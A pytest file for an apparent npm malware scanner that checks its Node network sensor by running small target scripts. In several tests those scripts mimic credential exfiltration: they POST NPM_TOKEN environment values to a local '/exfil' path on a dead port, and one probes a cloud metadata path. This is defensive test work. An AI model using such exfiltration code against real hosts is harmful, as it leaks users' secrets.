# CLASS MAP — the L4 sensor END TO END: the REAL instrument
# (docker.instrumentation_source) executed by a REAL node against a target
# script, its trace parsed by evidence.parse_l4_trace and rendered by
# render_timeline. Blackbox: the only inputs are the target's source + env, the
# only assertions are on parsed events and rendered text.
#
# This tier exists because the three defects it pins were all invisible to Python
# unit tests over hand-authored traces — the instrument is JavaScript and the bugs
# were in what it EMITS, so nothing short of running it could falsify them.
#
# Axes: requested-URL shape (explicit port / default port / string / URL instance
#       / host-with-port) × api used (request / get) × body presence and size
#       × require origin (instrument / node bootstrap / package) × inspector on-off
#   C1 a non-default port survives into the logged URL (three judges refuted live
#      credential exfil citing the port the old builder dropped)
#   C2 a default port is NOT invented — the mirror-image mismatch
#   C3 the request body is captured, bounded by the per-request cap, and bodyBytes
#      reports the TRUE submitted size so truncation is visible not silent
#   C4 no require event is the instrument's own, with the inspector fragment on or
#      off (the hook is installed after every fragment that requires anything)
#   C5 http.get / https.get are captured — Node's get calls the module-internal
#      request(), so patching `request` alone left every get invisible at L4
#   C6 render_timeline names which MINTED env canaries a captured body carries,
#      says nothing when there is no body, and never cites a planted value the
#      engine did not mint (`CI=true`, exfiltrated in the same request)
#   C7 the string and URL-instance request forms keep their own authority verbatim
import json
import shutil
import subprocess

import pytest

from npmguard.contract.models import RunArtifact
from npmguard.docker import instrumentation_source
from npmguard.evidence import (
    compute_event_summary,
    mint_canary,
    parse_l4_trace,
    render_timeline,
    seal_run_artifact,
)

pytestmark = pytest.mark.skipif(
    shutil.which("node") is None,
    reason="node is not on PATH — the L4 instrument is JavaScript and must be run to be proven",
)

# Port 9 (discard) is closed in every environment we run in, so a connect fails
# fast and locally: the instrument records what the package SUBMITTED, which is
# what we are proving, and no packet leaves the host.
DEAD_PORT = 9


def _run(tmp_path, source: str, *, inspector: bool = False, env: dict[str, str] | None = None):
    """Execute `source` under the real instrument in a real node, exactly as the
    sandbox does (`node --require <instrument> -e 'require("<target>")'`), and
    return the parsed L4 events."""
    instrument = tmp_path / "_instrument.js"
    instrument.write_text(instrumentation_source(inspector), encoding="utf-8")
    target = tmp_path / "target.js"
    target.write_text(source, encoding="utf-8")
    completed = subprocess.run(
        [
            "node",
            "--require",
            str(instrument),
            "-e",
            f"require({json.dumps(str(target))})",
        ],
        capture_output=True,
        text=True,
        timeout=60,
        cwd=tmp_path,
        env={"PATH": "/usr/bin:/bin:/usr/local/bin", "HOME": str(tmp_path), **(env or {})},
    )
    events = parse_l4_trace(completed.stdout, instrument_path=str(instrument))
    assert events is not None, (
        f"no L4 trace in stdout (exit={completed.returncode}): {completed.stderr[-2000:]}"
    )
    return events


def _network(events):
    return [event.normalized for event in events if event.kind == "network"]


def _requires(events):
    return [event.normalized for event in events if event.kind == "require"]


def test_explicit_port_survives_into_the_logged_url(tmp_path) -> None:
    """C1: the options form the running example's exfiltrate() uses — hostname +
    port + path — logs the authority the package actually requested. The old
    builder dropped `port`, and hyp-0001/0006/0007 each refuted live credential
    exfiltration on the resulting endpoint mismatch."""
    events = _run(
        tmp_path,
        f"""
        const http = require('http');
        const url = new URL('http://127.0.0.1:{DEAD_PORT}/exfil');
        const req = http.request({{ hostname: url.hostname, port: url.port,
          path: url.pathname, method: 'POST' }});
        req.on('error', () => {{}});
        req.end();
        """,
    )
    assert _network(events)[0]["url"] == f"http://127.0.0.1:{DEAD_PORT}/exfil"
    assert _network(events)[0]["method"] == "POST"


def test_default_port_is_never_invented(tmp_path) -> None:
    """C2: no port specified means no port rendered — synthesizing ':80' would
    mismatch a hypothesis phrased around the bare host, the same failure mirrored."""
    events = _run(
        tmp_path,
        """
        const http = require('http');
        const https = require('https');
        for (const mod of [http, https]) {
          const req = mod.request({ hostname: '127.0.0.1', path: '/plain' });
          req.on('error', () => {});
          req.end();
        }
        """,
    )
    assert [entry["url"] for entry in _network(events)] == [
        "http://127.0.0.1/plain",
        "https://127.0.0.1/plain",
    ]


def test_string_and_url_instance_forms_keep_their_authority(tmp_path) -> None:
    """C7: `request(string)` and `request(new URL(...))` already carry a complete
    authority; both are recorded verbatim, port and all. The URL-instance form used
    to lose BOTH the port and the path (only `hostname` was read)."""
    events = _run(
        tmp_path,
        f"""
        const http = require('http');
        for (const target of ['http://127.0.0.1:{DEAD_PORT}/from-string',
                              new URL('http://127.0.0.1:{DEAD_PORT}/from-url')]) {{
          const req = http.request(target, {{ method: 'PUT' }});
          req.on('error', () => {{}});
          req.end();
        }}
        """,
    )
    assert [entry["url"] for entry in _network(events)] == [
        f"http://127.0.0.1:{DEAD_PORT}/from-string",
        f"http://127.0.0.1:{DEAD_PORT}/from-url",
    ]
    # The method rides on the SECOND argument in these forms; reading it only off
    # the first logged every such request as a GET.
    assert {entry["method"] for entry in _network(events)} == {"PUT"}


def test_host_with_embedded_port_is_not_duplicated(tmp_path) -> None:
    """C1: Node accepts the port inside `host`; the authority must be recorded once,
    never `localhost:9:9`."""
    events = _run(
        tmp_path,
        f"""
        const http = require('http');
        const req = http.request({{ host: '127.0.0.1:{DEAD_PORT}', path: '/once' }});
        req.on('error', () => {{}});
        req.end();
        """,
    )
    assert _network(events)[0]["url"] == f"http://127.0.0.1:{DEAD_PORT}/once"


def test_request_body_is_captured_and_bounded_with_true_size(tmp_path) -> None:
    """C3: what the package writes to the request is captured so "was the canary in
    the payload?" is answerable; the capture is capped, and bodyBytes reports the
    real submitted size, so a truncated capture is visible rather than silent."""
    events = _run(
        tmp_path,
        f"""
        const http = require('http');
        const small = http.request({{ hostname: '127.0.0.1', port: {DEAD_PORT}, method: 'POST' }});
        small.on('error', () => {{}});
        small.write('{{"tok":"');
        small.end('CANARY-VALUE"}}');
        const big = http.request({{ hostname: '127.0.0.1', port: {DEAD_PORT}, method: 'POST' }});
        big.on('error', () => {{}});
        big.end('P'.repeat(9000));
        """,
    )
    small, big = _network(events)
    assert small["body"] == '{"tok":"CANARY-VALUE"}'  # write() + end(chunk) both captured
    assert small["bodyBytes"] == 22
    assert big["bodyBytes"] == 9000  # the TRUE size, not the kept size
    assert 0 < len(big["body"]) < 9000  # bounded
    assert len(big["body"]) <= 2048


def test_a_bodyless_request_records_no_body(tmp_path) -> None:
    """C3: a GET submits nothing, and that reads as 0 bytes — never as an empty
    payload the judge could cite as evidence of a benign request."""
    events = _run(
        tmp_path,
        f"""
        const http = require('http');
        const req = http.request({{ hostname: '127.0.0.1', port: {DEAD_PORT} }});
        req.on('error', () => {{}});
        req.end();
        """,
    )
    assert _network(events)[0]["bodyBytes"] == 0
    assert _network(events)[0]["body"] == ""


def test_http_get_is_captured_at_l4(tmp_path) -> None:
    """C5: Node's http.get calls the module-internal request(), so patching the
    exported `request` alone left every get invisible at L4 — the running example's
    IMDS probe reached the timeline only via the pcap sensor."""
    events = _run(
        tmp_path,
        f"""
        const http = require('http');
        const https = require('https');
        http.get('http://127.0.0.1:{DEAD_PORT}/latest/meta-data/', () => {{}})
          .on('error', () => {{}});
        https.get({{ hostname: '127.0.0.1', port: {DEAD_PORT}, path: '/tls' }}, () => {{}})
          .on('error', () => {{}});
        """,
    )
    assert [entry["url"] for entry in _network(events)] == [
        f"http://127.0.0.1:{DEAD_PORT}/latest/meta-data/",
        f"https://127.0.0.1:{DEAD_PORT}/tls",
    ]


@pytest.mark.parametrize("inspector", [False, True])
def test_no_require_event_is_the_instruments_own(tmp_path, inspector: bool) -> None:
    """C4: `fs`, `http`, `https`, `child_process`, `crypto`, `inspector` and `module`
    used to head EVERY timeline as though the package had required them — the hook
    was installed before the instrument's own dependencies. With the hook installed
    last, the requiring module of every logged require is the package (or Node's
    parentless `-e` bootstrap, which the renderer names as such)."""
    events = _run(
        tmp_path,
        "require('path'); require('child_process');",
        inspector=inspector,
    )
    instrument = str(tmp_path / "_instrument.js")
    assert instrument not in {entry["from"] for entry in _requires(events)}
    package_requires = [
        entry["module"] for entry in _requires(events) if entry["from"] == str(tmp_path / "target.js")
    ]
    assert package_requires == ["path", "child_process"]


def test_planted_env_canary_in_a_body_is_named_in_the_timeline(tmp_path) -> None:
    """C6: a canary planted via setEnv and found in a captured request body is named
    on the rendered line, so a judge can cite the correlation. hyp-0004 refuted real
    exfiltration for exactly this gap: "the POST request is recorded but its payload
    is not specified". End to end on the real objects: the value is minted by
    `mint_canary`, read out of `process.env` by real node, captured by the real
    instrument, and matched by the renderer. `CI` is the control — it is planted and
    exfiltrated in the same request, and it is not bait, because bait is what the
    engine MINTED and not whatever the experiment happened to plant."""
    # A realistic `npm_` shape around the minted token: the renderer matches the token
    # alone, so a planted value may keep whatever shape the exfil branch requires.
    planted = {"NPM_TOKEN": f"npm_{mint_canary()}", "CI": "true"}
    events = _run(
        tmp_path,
        f"""
        const http = require('http');
        const req = http.request({{ hostname: '127.0.0.1', port: {DEAD_PORT},
          path: '/exfil', method: 'POST' }});
        req.on('error', () => {{}});
        req.end(JSON.stringify({{ npm: process.env.NPM_TOKEN, ci: process.env.CI }}));
        """,
        env=planted,
    )
    artifact = seal_run_artifact(
        {
            "runId": "run-l4",
            "triggerUsed": {"kind": "entrypoint", "target": "target.js"},
            "setupApplied": {"env": planted},
            "observe": {
                "kernel": False,
                "network": False,
                "fsDiff": False,
                "node": True,
                "inspector": False,
            },
            "budget": {"wallMs": 20000},
            "wallMs": 1.0,
            "exitCode": 0,
            "timedOut": False,
            "events": [event.model_dump(mode="json") for event in events],
            "eventSummary": compute_event_summary(events).model_dump(mode="json"),
            "error": None,
            "createdAt": "2026-07-24T00:00:00Z",
        }
    )
    assert isinstance(artifact, RunArtifact)
    text = render_timeline(artifact).text
    line = next(row for row in text.splitlines() if " net " in row)
    assert f"POST http://127.0.0.1:{DEAD_PORT}/exfil" in line
    assert "carries planted env NPM_TOKEN" in line
    # CI was planted and exfiltrated in the same body, and is still not cited: it is
    # not a minted canary, so an ordinary value can never manufacture a citation.
    assert "CI" not in line.split("carries planted env")[1]
